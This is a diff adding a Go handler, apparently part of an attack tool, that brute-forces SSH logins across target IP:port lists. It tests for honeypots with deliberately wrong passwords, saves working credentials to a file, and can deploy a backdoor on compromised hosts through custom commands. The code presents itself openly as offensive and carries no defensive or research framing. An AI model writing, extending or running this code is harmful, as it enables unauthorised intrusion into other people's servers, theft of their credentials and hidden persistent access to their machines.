@@ -1,0 +1,87 @@
+// Handler: SSH (模式 6)
+// 直接 SSH 连接 + 蜜罐检测 + 可选后门部署
+
+import (
+	"fmt"
+	"strings"
+	"sync/atomic"
+	"time"
+)
+
+func processIP(ipPort string, file *os.File, usernames []string, passwords []string) {
+	semaphore <- struct{}{}
+	wg.Add(1)
+	go func() {
+		done := make(chan struct{})
+		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					fmt.Println("Panic:", r)
+				}
+				atomic.AddInt64(&completedCount, 1)
+				<-semaphore
+				wg.Done()
+				close(done)
+			}()
+
+			parts := strings.Split(ipPort, ":")
+			if len(parts) != 2 {
+				fmt.Println("无效的 IP:Port 格式 ->", ipPort)
+				return
+			}
+
+			ip := strings.TrimSpace(parts[0])
+			port := strings.TrimSpace(parts[1])
+
+			found := false
+			for _, username := range usernames {
+				for _, password := range passwords {
+					client, success := trySSH(ip, port, username, password)
+					if success {
+						fakePasswords := []string{
+							password + "1234",
+							password + "abcd",
+							password + "!@#$",
+							password + "!@#12",
+							password + "!@6c2",
+						}
+						isHoneypot := false
+						for _, fake := range fakePasswords {
+							if _, fakeSuccess := trySSH(ip, port, username, fake); fakeSuccess {
+								isHoneypot = true
+								break
+							}
+						}
+
+						if isHoneypot {
+							client.Close()
+							found = true
+							break
+						}
+
+						if !isLikelyHoneypot(client) {
+							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s", ip, port, username, password))
+							if ENABLE_BACKDOOR {
+								deployBackdoor(client, ip, port, username, password, CUSTOM_BACKDOOR_CMDS)
+							}
+						}
+						client.Close()
+						found = true
+						break
+					}
+				}
+				if found {
+					break
+				}
+			}
+		}()
+
+		select {
+		case <-done:
+		case <-time.After(30 * time.Second):
+			atomic.AddInt64(&completedCount, 1)
+			<-semaphore
+			wg.Done()
+		}
+	}()
+}
